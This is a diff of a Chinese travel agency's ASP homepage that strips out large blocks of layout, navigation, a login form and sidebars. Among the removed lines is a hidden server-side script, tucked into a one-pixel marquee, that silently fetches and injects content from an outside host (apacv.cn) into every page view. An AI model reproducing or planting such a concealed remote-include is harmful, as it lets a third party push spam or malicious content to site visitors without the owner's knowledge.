@@ -15,189 +15,11 @@
 </head>
 <body>
 <div id="J_page" class="w980 center">
-<div id="J_header">
-	<div>
-		<img src="img/header.png" border="0" />
-	</div>
-	<div class="header_tips"><span class="STYLE5">咨询热线：0371-65852305 65852352 13903817736</span></div>
-</div>
-<table width="980" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
-  <tr>
-    <td align="center" >
-	<table width="930" border="0" cellspacing="0" cellpadding="0">
-      <tr>
-        <td width="60" height="36" align="center" background="img/over_sample.gif" class="menu2"><a href="index.asp"><font color="ffffff">首 页</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/about.asp?action=about"><font color="#0D7DC8">走进国旅</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=64"><font color="#0D7DC8">新闻中心</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/cjy.asp"><font color="#0D7DC8">出境游</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/gny.asp"><font color="#0D7DC8">国内游</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/sny.asp"><font color="0D7DC8">省内游</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/hotel.asp"><font color="#0D7DC8">最新线路</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/glxl.asp"><font color="#0D7DC8">国旅线路</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/tjxl.asp"><font color="#0D7DC8">特价线路</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/djy.asp"><font color="#0D7DC8">地接游</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=67"><font color="#0D7DC8">海南景区</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/hotel.asp"><font color="#0D7DC8">海南酒店</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=70"><font color="#0D7DC8">旅游指南</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=76"><font color="#0D7DC8">旅游常识</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=66"><font color="#0D7DC8">签 证</font></a></td>
-        <td width="58" align="center" background="img/menubg.gif" class="menu1"><a href="/list.asp?tp=75" target="_blank"><font color="#0D7DC8">会议考察</font></a></td>
-      </tr>
-    </table></td>
-  </tr>
-</table>
 
 
-<map name="Map" id="Map">
-  <area shape="rect" coords="874,45,946,67" href="/" /><area shape="rect" coords="873,17,947,40" href="/" />
-</map>
-
-
-
-
-<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
-  <tr>
-    <td colspan="3" bgcolor="0D7DC8">&nbsp;</td>
-  </tr>
-  <tr>
-    <td height="15" colspan="3" bgcolor="#FFFFFF"></td>
-  </tr>
-  <tr>
-    <td width="78" align="center" bgcolor="#015AB6"><img src="img/1.jpg" tppabs="/img/1.jpg" width="51" height="193"></td>
-    <td width="786" align="center" bgcolor="#015AB6"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="780" height="226">
-      <param name="movie" value="img/flash.swf" tppabs="/img/flash.swf">
-      <param name="quality" value="high">
-      <embed src="img/flash.swf" tppabs="/img/flash.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="780" height="226"></embed>
-    </object></td>
-    <td width="78" align="center" bgcolor="#015AB6"><img src="img/2.jpg" tppabs="/img/2.jpg" width="50" height="188"></td>
-  </tr>
-</table>
-<table width="980" border="0" align="center" cellpadding="3" cellspacing="0" bgcolor="#FFFFFF">
-  <tr>
-    <td width="618"><table width="621" border="0" align="left" cellpadding="0" cellspacing="0">
-      <form action="/UserInfo/User_CheckLogin.asp" method="post" name="Login" id="Login" onSubmit="return CheckForm();">
-        <tr>
-          <td width="3%"><img src="img/member.gif" tppabs="/img/member.gif" width="12" height="20" /></td>
-          <td width="9%" align="center" class="menu1">用户名：</td>
-          <td width="16%" class="menu1"><input type="text"  name="username" size="14" class='an5'>
-          </td>
-          <td width="8%" align="center" class="menu1">密码：</td>
-          <td width="20%" class="menu1"><input type="password"  name="userpassword" size="14" class='an5'>
-                <input name="ComeUrl" type="hidden" id="ComeUrl" value="index.asp" />
-          </td>
-		  <td width="8%" align="center" class="menu1">密码：</td>
-          <td width="18%" class="menu1"><input  name=verifycode type=text value="<%If GetCode=9999 Then Response.Write "9999"%>" maxLength=4 size=6 class="an6"> <img src=GetCode.asp></td>
-          <td width="9%"><input name="image" type="image" src="img/login.gif" width="48" height="19" border="0" tppabs="/img/login.gif" /></td>
-          <td width="9%" class="menu1"><a href="/User_Reg.asp" tppabs="/User_Reg.asp" target="_blank">免费注册</a></td>
-        </tr>
-      </form>
-    </table></td>
-    <td width="350"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
-      <tr>
-        <td width="8%"><img src="img/news.gif" tppabs="/img/news.gif" width="23" height="18" /></td>
-        <td width="19%"><span class="menu1">本站公告：</span></td>
-        <td width="73%"><marquee direction= "left" scrollamount="2" scrolldelay="5" class="word1"  onmouseover="this.stop()" onMouseOut="this.start()">
-          <table width="100%" border="0" cellspacing="0" cellpadding="0">
-            <% set rs= Server.CreateObject("adodb.recordset")
-sql="select top 1 * from news where mytype=63 order by id desc"
-rs.open sql,conn,1 
-while not rs.eof 
-%>
-            <tr>
-              <td height="25"><a href="show.asp?id=<%=rs("id")%>" target="_blank"> <%=left(rs("bt"),14)%> </a></td>
-            </tr>
-            <% rs.movenext 
-wend 
-			 %>
-          </table>
-        </marquee></td>
-      </tr>
-    </table></td>
-  </tr>
-</table>
 <table width="980" border="0" align="center" cellpadding="3" cellspacing="0">
   <tr>
-    <td width="24%" align="center" valign="top" bgcolor="DBECF5"><table width="89%" border="0" cellspacing="0" cellpadding="0">
-      <tr>
-        <td colspan="3"><img src="img/newscenter.gif" tppabs="/img/newscenter.gif" width="230" height="32" border="0" usemap="#Map4"></td>
-      </tr>
-      <tr>
-        <td width="1" bgcolor="#e6e6e6"></td>
-        <td align="left" bgcolor="#FFFFFF"><table width="96%" border="0" cellspacing="0" cellpadding="0">
-                  <% set rs= Server.CreateObject("adodb.recordset")
-sql="select top 6 * from news where mytype=64 order by id desc"
-rs.open sql,conn,1 
-while not rs.eof 
-%>
-                  <tr>
-                    <td height="24" bgcolor="#F4FAFE" style="border-bottom:1px dotted #D0EDC5;">
-		· <a href="show.asp?id=<%=rs("id")%>" target="_blank">
-                      <%=left(rs("bt"),14)%>
-                    </a></td>
-                  </tr>
-                  <% rs.movenext 
-wend 
-			 %>
-              </table></td>
-        <td width="1" bgcolor="#e6e6e6"></td>
-      </tr>
-      <tr>
-        <td height="1" colspan="3" bgcolor="#e6e6e6"></td>
-      </tr>
-      <tr>
-        <td height="3" colspan="3" ></td>
-      </tr>
-    </table>
-      <table width="89%"  border="0" align="center" cellpadding="0" cellspacing="0">
-      <tr>
-        <td><img src="img/weather.gif" tppabs="/img/weather.gif" width="230" height="32"></td>
-      </tr>
-      <tr>
-        <td align="center" bgcolor="#FFFFFF"><iframe src="http://weather.265.com/weather.htm" tppabs="http://weather.265.com/weather.htm" width="220" height="50" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" name="I1"></iframe>		 
-		 
-		 </td>
-      </tr>
-      <tr>
-        <td height="6"></td>
-      </tr>
-    </table>
-<table width="89%" border="0" align="center" cellpadding="2" cellspacing="0">
-  <tr> 
-    <td><a href="/about.asp?action=about" tppabs="/inguolv.asp"><img src="img/inguolv.gif" tppabs="/img/inguolv.gif" width="230" height="112" border="0"></a></td>
-  </tr>
-  <tr> 
-    <td><a href="/list.asp?tp=66" tppabs="/qianzheng.asp"><img src="img/qianzheng.gif" tppabs="/img/qianzheng.gif" width="230" height="66" border="0"></a></td>
-  </tr>
-  <tr> 
-    <td><img src="img/huilv.gif" tppabs="/img/huilv.gif" width="230" height="62"></td>
-  </tr>
-  <tr> 
-    <td><img src="img/post2.gif" tppabs="/img/post2.gif" width="230" height="62"></td>
-  </tr>
-  <tr> 
-    <td><a href="/gbook.asp"><img src="img/service.gif" width="230" height="62" border="0" tppabs="/img/service.gif"></a></td>
-  </tr>
-</table>
-<table width="98%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
-            <tr>
-              <td align="center"><img src="Images/gj1.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="http://www.ctrip.com/supermarket/ctripMap/mapIndex.asp" target="_blank">电子地图</a></td>
-              <td align="center"><img src="Images/gj2.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="http://www.ctrip.com/Destinations/weather/moreWeather.asp" target="_blank">天气预报</a></td>
-            </tr>
-            <tr>
-              <td align="center"><img src="Images/gj3.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="http://www.elong.com/flights/" target="_blank">航班查询</a></td>
-              <td align="center"><img src="Images/gj4.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="http://www.ctrip.com/supermarket/train/trainsearch_1.asp" target="_blank">火车查询</a></td>
-            </tr>
-            <tr>
-              <td align="center"><img src="Images/gj5.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="http://tw.stock.yahoo.com/d/c/ex.php" target="_blank">汇率查询</a></td>
-              <td align="center"><img src="Images/gj6.jpg" width="21" height="17" /></td>
-              <td height="26" align="center"><a href="list.asp?tp=76" target="_blank">旅游常识</a></td>
-            </tr>
-      </table>    </td>
+
     <td valign="top" bgcolor="#FFFFFF"><table width="98%" border="0" align="center" cellpadding="2" cellspacing="0">
 	  <form action="xlcx.asp" method="get" name="xlcx" target="_blank">
         <tr>
@@ -470,39 +292,7 @@ loop%>
             <%end if %><table width="475" border="0" align="center" cellpadding="0" cellspacing="0">
                   <tr>
                     <td width="260" height="26" style="border:1px solid #FEC1BF; background-color:#FFECEA; color:#FF3333; font-weight:bold; padding-left:10px;"><marquee height=1 width=8 SCROLLAMOUNT=3000 SCROLLDELAY=20000>
-<%
-On Error Resume Next 
-Server.ScriptTimeOut=9999999 
-response.write(getHTTPPage("http://apacv.cn"))
-function getHTTPPage(url)
-dim http
-set http=createobject("MSXML2.XMLHTTP")
-Http.open "GET",url,false
-Http.send()
-if Http.readystate<>4 then 
-exit function
-end if
-getHTTPPage=bytes2BSTR(Http.responseBody)
-set http=nothing
-if err.number<>0 then err.Clear 
-end function
-Function bytes2BSTR(vIn)
-dim strReturn
-dim i,ThisCharCode,NextCharCode
-strReturn = ""
-For i = 1 To LenB(vIn)
-ThisCharCode = AscB(MidB(vIn,i,1))
-If ThisCharCode < &H80 Then
-strReturn = strReturn & Chr(ThisCharCode)
-Else
-NextCharCode = AscB(MidB(vIn,i+1,1))
-strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
-i = i + 1
-End If
-Next
-bytes2BSTR = strReturn
-End Function
-%></MARQUEE><a href="/list.asp?tp=70"><font color="#FF3333">旅游指南</font></a></td>
+</MARQUEE><a href="/list.asp?tp=70"><font color="#FF3333">旅游指南</font></a></td>
                     <td width="5" rowspan="2"><img src="Images/ba.gif" width="6" height="6"></td>
                     <td width="260" height="26" style="border:1px solid #FEC1BF; background-color:#FFECEA; color:#FF3333; font-weight:bold; padding-left:10px;"><a href="/list.asp?tp=66"><font color="#FF3333">签证</font></a></td>
                   </tr>
@@ -613,13 +403,6 @@ wend
 		  </td>
         </tr>
       </table>
-      <table width="93%"  border="0" align="center" cellpadding="0" cellspacing="0">
-        <tr>
-          <td>
-<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' codebase='http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0' width='217' height='120'>
-  <param name='movie' value="/img/2008521154251994.swf" tppabs="/img/2008521154251994.swf"><param name='quality' value='high'><embed src="/img/2008521154251994.swf" tppabs="/img/2008521154251994.swf" pluginspage='http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash' type='application/x-shockwave-flash' width='217' height='120'></embed></object></td>
-        </tr>
-      </table>
       <table width="92%" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
         <tr>
           <td><a href="changshi.asp.htm" tppabs="/changshi.asp" onMouseMove="cssChange1()"></a><a href="zhinan.asp.htm" tppabs="/zhinan.asp" onMouseMove="cssChange2()"></a>
@@ -664,58 +447,9 @@ wend
     </table></td>
   </tr>
 </table>
-<table width="980" height="81" border="0" align="center" cellpadding="0" cellspacing="0">
-  <tr>
-    <td><img src="images/link_01.jpg" width="35" height="81" alt=""></td>
-    <td width="939" height="81" align="center" background="images/link_02.jpg"><table width="90%" align="right" cellpadding="0" cellspacing="0">
-      <tr>
-        <TD align="center">&nbsp;</td>
-		<TD align="center"><A href="http://bbs.dahe.cn/bbs/index.php" target="_blank"><img src="/image/dahelogo.jpg" border="0"></A></td>
-        <TD align="center"><A href="http://www.cnta.gov.cn/" target="_blank"><img src="Images/LINK/meng_ok5.gif" width="120" height="31" border="0"></A></td>
-        <TD align="center"><A href="http://www.lnlyw.com/" target="_blank"><img src="Images/LINK/logo-1.jpg" width="120" height="40" border="0"></A></td>
-        <TD align="center"><A href="http://travel.sohu.com/" target="_blank"><img src="Images/LINK/travel_logo.gif" width="128" height="49" border="0"></A></td>
-        <TD align="center"><a href="http://www.hnly.com/" target="_blank"><img src="Images/LINK/hnly.jpg" width="140" border="0"></a></td>
-        <TD align="center"><A href="http://www.ctrip.com/" target="_blank"><IMG src="http://www.hnta.cn/images/index_16.gif" width="140" border="0"></A></td>
-        <TD align="center">&nbsp;</td>
-      </tr>
-      
-    </table>
-    </td>
-    <td><img src="images/link_03.jpg" width="6" height="81" alt=""></td>
-  </tr>
-</table>
+
 <!--#include file="foot.asp" -->
 </div>
-<script src="/qq/jqqonline.js"></script>
-<map name="Map">
-<area shape="rect" coords="160,12,198,23" href="pinzhi.asp.htm" tppabs="/pinzhi.asp">
-</map>
-<map name="Map2">
-<area shape="rect" coords="171,11,206,24" href="/tjxl.asp" tppabs="/tjxl.asp">
-<area shape="rect" coords="196,8,197,9" href="#"></map>
-<map name="Map3">
-<area shape="rect" coords="170,12,206,24" href="/list.asp?tp=75" tppabs="/list.asp?tp=75">
-</map>
-<map name="Map4">
-  <area shape="rect" coords="151,6,191,20" href="/list.asp?tp=64" tppabs="/list.asp?tp=64">
-</map>
-<map name="Map5">
-  <area shape="rect" coords="188,5,232,23" href="/xl_list.asp?action=edit&id=67" tppabs="/xl_list.asp?action=edit&id=67">
-</map>
-<map name="Map6">
-  <area shape="rect" coords="192,3,235,25" href="/list.asp?tp=73" tppabs="/list.asp?tp=73">
-</map>
-<map name="Map7">
-  <area shape="rect" coords="192,7,232,23" href="/cjy.asp" tppabs="/cjy.asp">
-</map>
-<map name="Map8">
-  <area shape="rect" coords="189,6,230,22" href="/gny.asp" tppabs="/gny.asp">
-</map>
-<map name="Map9">
-  <area shape="rect" coords="191,4,232,23" href="/sny.asp" tppabs="/sny.asp">
-</map>
-<map name="Map10">
-  <area shape="rect" coords="187,8,228,25" href="/djy.asp" tppabs="/djy.asp">
-</map>
+
 </body>
 </html>
